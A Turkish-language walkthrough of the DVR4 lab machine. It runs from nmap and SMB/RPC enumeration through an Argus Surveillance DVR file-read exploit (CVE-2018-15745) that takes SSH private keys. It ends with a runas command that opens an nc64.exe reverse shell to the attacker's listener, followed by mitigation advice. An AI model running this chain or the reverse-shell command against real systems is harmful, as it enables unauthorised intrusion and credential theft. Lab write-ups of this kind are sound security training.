# DVR4 — Walkthrough

**Hedef İşletim Sistemi:** Windows
**Zorluk:** Orta
**Anahtar Servisler:** SSH (Bitvise WinSSHD), SMB, RPC, Argus Surveillance DVR (HTTP 8080)

---

## 1. Keşif (Nmap)

Hedef üzerinde yapılan tam port taraması sonucunda aşağıdaki servisler tespit edildi:

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey:
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
|_  384  e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8080/tcp open  http-proxy
|_http-title: Argus Surveillance DVR
```

**Gözlemler:**
- SSH servisi **Bitvise WinSSHD 8.48** sürümünü kullanıyor.
- 135/139/445 portları standart Windows SMB/RPC servislerine işaret ediyor.
- 8080 portunda **Argus Surveillance DVR** web arayüzü çalışıyor.

---

## 2. Servis Enumerasyonu

### 2.1 Bitvise WinSSHD (Port 22)

Bilinen Bitvise WinSSHD zafiyetleri araştırıldı, fakat bu sürüm/yapılandırma için kullanılabilir doğrudan bir exploit bulunamadı.

### 2.2 RPC Enumerasyonu

```bash
rpcclient -U "" -N <IP>
```

Null session ile bağlantı denendi, ancak anlamlı bir çıktı elde edilemedi (boş/empty result).

### 2.3 SMB Enumerasyonu

```bash
smbclient -L //<IP> -N
smbclient -L //<IP> -U ""
```

Null session ve boş kullanıcı adıyla giriş denemeleri yapıldı; varsayılan (default) credential'lar veya açık paylaşımlar bulunamadı.

### 2.4 Web Uygulaması (Port 8080) — Argus Surveillance DVR

`http://<IP>:8080` adresine gidildiğinde **Argus Surveillance DVR** giriş paneli ile karşılaşıldı. Sayfa üzerinde iki kullanıcı adı gözlemlendi:

- `Administrator`
- `Viewer`

Bu ürün adı ve sürüm bilgisiyle birlikte bilinen CVE'ler araştırıldı.

---

## 3. Zafiyet Tespiti — CVE-2018-15745

Argus Surveillance DVR yazılımının bu sürümünde bir **directory traversal / arbitrary file read** zafiyeti bulunmaktadır (CVE-2018-15745). Bu zafiyet, kimlik doğrulaması olmadan sunucu üzerindeki dosyalara erişim sağlamaktadır.

Kullanılan exploit:
🔗 https://github.com/Jasurbek-Masimov/CVE-2018-15745/tree/main

Bu zafiyet kullanılarak hedef sistemde SSH için kullanılan private key dosyaları çekilmeye çalışıldı:

```
C:\Users\Administrator\.ssh\id_rsa
C:\Users\Viewer\.ssh\id_rsa
```

İki kullanıcıya ait `id_rsa` private key dosyaları başarıyla elde edildi.

---

## 4. Foothold — SSH ile Giriş (Viewer)

Elde edilen `Viewer` kullanıcısına ait private key kullanılarak SSH bağlantısı sağlandı:

```bash
chmod 600 viewer_id_rsa
ssh -i viewer_id_rsa viewer@<IP>
```

Bağlantı başarılı oldu ve `Viewer` kullanıcısı olarak sistem üzerinde shell elde edildi.

> **Not:** `Administrator` private key'i ile doğrudan bağlantı denendiğinde başarılı olunamadı / kısıtlı yetkiler gözlemlendi, bu yüzden privilege escalation aşamasına geçildi.

---

## 5. Privilege Escalation

### 5.1 Weak Encryption Zafiyeti

Sistem üzerinde incelemeler yapılırken, kullanılan şifreleme/parola saklama mekanizmasının **zayıf (weak encryption)** olduğu tespit edildi. Bu zafiyet sayesinde elde edilen veriler kırılarak (cracking) düz metin (plaintext) parolalara ulaşıldı.

### 5.2 Administrator Olarak Komut Çalıştırma

Elde edilen Administrator parolası kullanılarak `runas` komutu ile, kendi makinemizden indirilen `nc64.exe` ile bir reverse shell tetiklendi:

**Local makinede listener başlatıldı:**

```bash
nc -lvnp <LOKAL_PORT>
```

**Hedef üzerinde (Viewer shell üzerinden) çalıştırıldı:**

```cmd
runas /env /user:DVR\Administrator "C:\Users\viewer\nc64.exe <LOKAL_IP> <LOKAL_PORT> -e powershell"
```

Komut çalıştırıldıktan sonra parola istendiğinde 5.1 adımında elde edilen Administrator parolası girildi.

Listener tarafında bağlantı geldi ve **`DVR\Administrator`** yetkisiyle bir PowerShell oturumu elde edildi.

```powershell
PS C:\Windows\system32> whoami
dvr\administrator
```

---

## 6. Özet — Saldırı Zinciri

1. **Nmap** ile servis/versiyon keşfi (SSH, SMB, RPC, HTTP-8080).
2. SMB/RPC üzerinde null session ve default credential denemeleri → sonuçsuz.
3. Port 8080'de **Argus Surveillance DVR** web panelinde `Administrator` ve `Viewer` kullanıcıları tespit edildi.
4. **CVE-2018-15745** (arbitrary file read) ile her iki kullanıcının SSH `id_rsa` private key'leri çekildi.
5. `Viewer` private key'i ile SSH üzerinden foothold elde edildi.
6. Sistemde tespit edilen **weak encryption** zafiyeti sayesinde parola kırılarak Administrator parolasına ulaşıldı.
7. `runas` + `nc64.exe` reverse shell tekniğiyle **DVR\Administrator** yetkisi elde edilerek root/SYSTEM seviyesinde erişim sağlandı.

---

## 7. Alınacak Dersler / Mitigasyon Önerileri

- Argus Surveillance DVR yazılımı güncel sürüme yükseltilmeli veya bilinen CVE'lere karşı yamalanmalıdır.
- SSH private key dosyaları, web uygulamasının erişebileceği dizinlerden tamamen izole edilmelidir.
- Parola/credential saklama mekanizmalarında güçlü, sektör standardı şifreleme algoritmaları (örn. bcrypt, AES-256) kullanılmalıdır.
- `runas` ile yetki yükseltmeye izin veren servis hesaplarının parolaları düzenli olarak rotate edilmeli ve karmaşıklık politikaları uygulanmalıdır.